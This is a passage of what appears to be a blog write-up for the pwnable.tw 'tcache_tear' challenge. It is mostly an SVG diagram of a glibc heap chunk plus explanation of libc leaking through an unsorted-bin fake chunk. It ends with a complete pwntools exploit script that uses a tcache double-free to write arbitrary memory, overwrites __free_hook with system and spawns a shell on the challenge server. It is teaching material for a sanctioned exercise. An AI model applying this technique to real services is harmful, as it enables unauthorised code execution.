nowrap;">8</div></div></div></foreignObject><text font-size="11px" x="440" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">8</text></switch></g><path d="M 140 16 L 140 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 6px; margin-left: 160px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 11px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; background-color: #ffffff; white-space: nowrap;">1</div></div></div></foreignObject><text font-size="11px" x="160" y="9" fill="#000000" font-family="Helvetica" text-anchor="middle">1</text></switch></g><path d="M 460 16 L 460 6" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="200" x="140" y="56"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 198px; height: 1px; padding-top: 76px; margin-left: 141px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Chunk Size<br style="font-size: 6px"/><font size="1">(Aligned to 16 bytes - bottom 3 bits are 1)</font></div></div></div></foreignObject><text font-size="12px" x="240" y="80" fill="#000000" font-family="Helvetica" text-anchor="middle">Chunk Size...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="40" x="340" y="56"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 76px; margin-left: 341px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">A<br style="font-size: 5px"/><font style="font-size: 4px">NON_MAIN_ARENA</font></div></div></div></foreignObject><text font-size="12px" x="360" y="80" fill="#000000" font-family="Helvetica" text-anchor="middle">A...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="40" x="380" y="56"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 76px; margin-left: 381px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">M<br style="font-size: 7px"/><font style="font-size: 4px">IS_MMAPPED</font></div></div></div></foreignObject><text font-size="12px" x="400" y="80" fill="#000000" font-family="Helvetica" text-anchor="middle">M...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="40" x="420" y="56"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 76px; margin-left: 421px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">P<br style="font-size: 7px"/><font style="font-size: 4px">PREV_INUSE</font></div></div></div></foreignObject><text font-size="12px" x="440" y="80" fill="#000000" font-family="Helvetica" text-anchor="middle">P...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="320" x="140" y="96"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 116px; margin-left: 141px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Pointer to Next Chunk<br style="font-size: 7px"/><font size="1">(fwd pointer)</font></div></div></div></foreignObject><text font-size="12px" x="300" y="120" fill="#000000" font-family="Helvetica" text-anchor="middle">Pointer to Next Chunk...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="320" x="140" y="136"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 156px; margin-left: 141px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Pointer to Previous Chunk<br style="font-size: 7px"/><font size="1">(bck pointer)</font></div></div></div></foreignObject><text font-size="12px" x="300" y="160" fill="#000000" font-family="Helvetica" text-anchor="middle">Pointer to Previous Chunk...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="320" x="140" y="176"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 196px; margin-left: 141px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Unused Space<br/><font style="font-size: 10px">(used to align chunk to 16 byte boundary)</font></div></div></div></foreignObject><text font-size="12px" x="300" y="200" fill="#000000" font-family="Helvetica" text-anchor="middle">Unused Space...</text></switch></g><rect fill="none" height="40" pointer-events="all" stroke="none" width="120" x="0" y="136"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 156px; margin-left: 1px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">User Memory Region</div></div></div></foreignObject><text font-size="12px" x="60" y="160" fill="#000000" font-family="Helvetica" text-anchor="middle">User Memory Region</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="320" x="140" y="16"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 36px; margin-left: 141px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Size of Previous Chunk<br/><font style="font-size: 10px">(Only valid if P is set)</font></div></div></div></foreignObject><text font-size="12px" x="300" y="40" fill="#000000" font-family="Helvetica" text-anchor="middle">Size of Previous Chunk...</text></switch></g><rect fill="#ffffff" height="40" pointer-events="all" stroke="#000000" width="320" x="140" y="216"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 318px; height: 1px; padding-top: 236px; margin-left: 141px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Size of Previous Chunk<br/><font style="font-size: 10px">(Same as <i>Chunk Size</i>)</font></div></div></div></foreignObject><text font-size="12px" x="300" y="240" fill="#000000" font-family="Helvetica" text-anchor="middle">Size of Previous Chunk...</text></switch></g><path d="M 480 16 L 475 16 Q 470 16 470 26 L 470 106 Q 470 116 465 116 L 462.5 116 Q 460 116 465 116 L 467.5 116 Q 470 116 470 126 L 470 206 Q 470 216 475 216 L 480 216" fill="none" pointer-events="all" stroke="#b85450" stroke-miterlimit="10" transform="rotate(180,470,116)"/><rect fill="none" height="20" pointer-events="all" stroke="none" width="102" x="478" y="105"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 100px; height: 1px; padding-top: 115px; margin-left: 479px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Chunk<br style="font-size: 8px"/><font size="1">(User Region - 0x10)<br/></font></div></div></div></foreignObject><text font-size="12px" x="529" y="119" fill="#000000" font-family="Helvetica" text-anchor="middle">Chunk...</text></switch></g><path d="M 140 96 L 135 96 Q 130 96 130 106 L 130 146 Q 130 156 125 156 L 122.5 156 Q 120 156 125 156 L 127.5 156 Q 130 156 130 166 L 130 206 Q 130 216 135 216 L 140 216" fill="none" pointer-events="all" stroke="#6c8ebf" stroke-miterlimit="10"/><path d="M 120 216 L 140 216 L 133.63 216" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10" stroke-opacity="0.8"/><path d="M 138.88 216 L 131.88 219.5 L 133.63 216 L 131.88 212.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-opacity="0.8" fill-opacity="0.8"/><rect fill="none" height="40" pointer-events="all" stroke="none" width="110" x="10" y="196"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 108px; height: 1px; padding-top: 216px; margin-left: 11px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">Start of Next Chunk</div></div></div></foreignObject><text font-size="12px" x="65" y="220" fill="#000000" font-family="Helvetica" text-anchor="middle">Start of Next Chunk</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a target="_blank" transform="translate(0,-5)" xlink:href="https://desk.draw.io/support/solutions/articles/16000042487"><text font-size="10px" x="50%" y="100%" text-anchor="middle">Viewer does not support full SVG 1.1</text></a></switch></svg><p>Unsorted bins are a circularly linked list. This means that in an unsorted bin with a single chunk, the chunk will have its <code>fwd</code> and <code>bck</code> pointers set to the address of the unsorted bin. If we are able to read either the <code>fwd</code> or <code>bck</code> pointer, we have an address with a known offset from libc.</p><h2 id="crafting-chunks">Crafting Chunks</h2><p>Luckily, we have the <code>name</code> buffer and can print its contents. If we create a fake chunk of unsorted bin size and place it in the name buffer, we can leak libc.</p><p>Unfortunately, there are some <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks.html">security checks</a>:</p><ul><li>&quot;Check whether next chunk's (by memory) previous in use bit is marked&quot;</li><li>&quot;Check whether size of next chunk is within the minimum and maximum size (av-&gt;system_mem)&quot;</li><li>&quot;If the chunk is not within the size range of fastbin and isn't mmapped, check that it is not the same as the top chunk&quot;</li></ul><p>To bypass these checks we can create another chunk that is positioned immediately after the first chunk. The comments in the solution script explain this further.</p><h2 id="getting-a-shell">Getting a Shell</h2><p>Now that we have the libc base address, we can get the address of <code>__free_hook</code>. This is a function pointer that is called whenever free is called; the address of the chunk being freed is passed as a parameter. Conveniently, this function signature matches <code>system(char* cmd)</code>.</p><p>Now, if we call <code>malloc(&quot;/bin/sh\x00&quot;)</code> and then free the returned value, a shell is created.</p><h1 id="solution">Solution</h1><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*

</span><span style="color:#323232;">context.terminal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;/bin/sh&#39;

</span><span style="color:#323232;">r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&quot;chall.pwnable.tw&quot;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10207</span><span style="color:#323232;">)


elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./tcache_tear&#39;</span><span style="color:#323232;">)
libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./libc.so.6&#39;</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">malloc</span><span style="color:#323232;">(size, data):
	</span><span style="font-weight:bold;color:#a71d5d;">global </span><span style="color:#323232;">malloc_counter
	malloc_counter </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">1

	</span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#183691;">&#39;1&#39;</span><span style="color:#323232;">)
	r.recvuntil(</span><span style="color:#183691;">&#39;Size:&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#0086b3;">str</span><span style="color:#323232;">(size))
	r.recvuntil(</span><span style="color:#183691;">&#39;Data:&#39;</span><span style="color:#323232;">)
	r.send(data)
	
	info(</span><span style="color:#183691;">&quot;[Malloc </span><span style="color:#0086b3;">%d</span><span style="color:#183691;">] Allocated chunk [size: </span><span style="color:#0086b3;">%d</span><span style="color:#183691;">, data: </span><span style="color:#0086b3;">%s</span><span style="color:#183691;">]&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(malloc_counter, size, data))

free_counter </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0
</span><span style="color:#323232;">malloc_counter </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">free</span><span style="color:#323232;">():
	</span><span style="font-weight:bold;color:#a71d5d;">global </span><span style="color:#323232;">free_counter
	free_counter </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">1
	</span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#183691;">&#39;2&#39;</span><span style="color:#323232;">)
	info(</span><span style="color:#183691;">&quot;  [Free </span><span style="color:#0086b3;">{n}</span><span style="color:#183691;">] Freed last allocated chunk&quot;</span><span style="color:#323232;">.format(n</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;">free_counter))


</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">mem_write</span><span style="color:#323232;">(address, value, s):
	info(</span><span style="color:#183691;">&quot;[Mem Write ] Writing </span><span style="color:#0086b3;">%s</span><span style="color:#183691;"> to </span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(value, </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(address)))
	malloc(s, </span><span style="color:#183691;">&quot;anything&quot;</span><span style="color:#323232;">)
	free()
	free()
	malloc(s, p64(address))
	malloc(s, p64(address))
	malloc(s, value)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">get_info</span><span style="color:#323232;">():
	r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#183691;">&#39;3&#39;</span><span style="color:#323232;">)
	r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	</span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">r.recv(</span><span style="color:#0086b3;">0x20</span><span style="color:#323232;">)

</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(elf.got)
</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(elf.symbols)

r.recvuntil(</span><span style="color:#183691;">&#39;Name:&#39;</span><span style="color:#323232;">)
r.send(</span><span style="color:#183691;">&#39;anything&#39;</span><span style="color:#323232;">)


mem_write(</span><span style="color:#0086b3;">0x602550</span><span style="color:#323232;">, 
			p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Previous Size
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x21</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># Chunk Size (A=0, M=0, P=1)
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Forward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Backward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Empty Space
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x21</span><span style="color:#323232;">),	</span><span style="font-style:italic;color:#969896;"># Next Previous Size
		</span><span style="color:#0086b3;">0x70</span><span style="color:#323232;">)

mem_write(</span><span style="color:#0086b3;">0x602050</span><span style="color:#323232;">,
			p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602050		Previous Size 
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x501</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602058		Chunk Size (A=0, M=0, P=1)
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602060[name_buffer]	Forward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602068		Backward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">)</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#0086b3;">3 </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602070		Empty Space
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x602060</span><span style="color:#323232;">),	</span><span style="font-style:italic;color:#969896;"># 0x602088[malloced] 	Overwrite the last malloced value
		</span><span style="color:#0086b3;">0x60</span><span style="color:#323232;">)

</span><span style="font-style:italic;color:#969896;"># Next free will be free(0x602060) because we overwrote the last malloced value.

# Note that we need the free to be 0x602060 because free expects the user region of the chunk,
# not the start of the chunk

</span><span style="color:#323232;">free()  </span><span style="font-style:italic;color:#969896;"># free(0x602060)

# This free will overwrite the forward and backward pointer. Since this chunk is the only chunk 
# stored in an unsorted bin, the fwd and bck pointers will point to the location of the bin within
# libc. This location will have a constant offset with libc base.

</span><span style="color:#0086b3;">LEAKED_CHUNK_OFFSET </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0x3ebca0

</span><span style="color:#323232;">leaked_chunk_addr </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u64(get_info()[:</span><span style="color:#0086b3;">8</span><span style="color:#323232;">]) </span><span style="font-style:italic;color:#969896;"># Leaked address of malloc chunk

</span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">leaked_chunk_addr </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">LEAKED_CHUNK_OFFSET
</span><span style="color:#323232;">libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_BASE

</span><span style="color:#323232;">info(</span><span style="color:#183691;">&quot;Leaked chunk at &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(leaked_chunk_addr))
info(</span><span style="color:#183691;">&quot;Found libc base: &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">LIBC_BASE</span><span style="color:#323232;">))
info(</span><span style="color:#183691;">&quot;Found __free_hook address: &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(libc.symbols[</span><span style="color:#183691;">&#39;__free_hook&#39;</span><span style="color:#323232;">]))

mem_write(libc.symbols[</span><span style="color:#183691;">&#39;__free_hook&#39;</span><span style="color:#323232;">] , p64(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]), </span><span style="color:#0086b3;">0x50</span><span style="color:#323232;">)
malloc(</span><span style="color:#0086b3;">0x50</span><span style="color:#323232;">, </span><span style="color:#183691;">&quot;/bin/sh</span><span style="color:#0086b3;">\x00</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">)

free()

r.interactive()
</span></code></pre><h1 id="further-reading">Further Reading</h1><p>These are some resources that I found helpful when solving this challenge.</p><ol><li><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</a></li><li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c</a></li><li><a href="https://heap-exploitation.dhavalkapil.com/">https://heap-exploitation.dhavalkapil.com/</a></li></ol></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="💬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>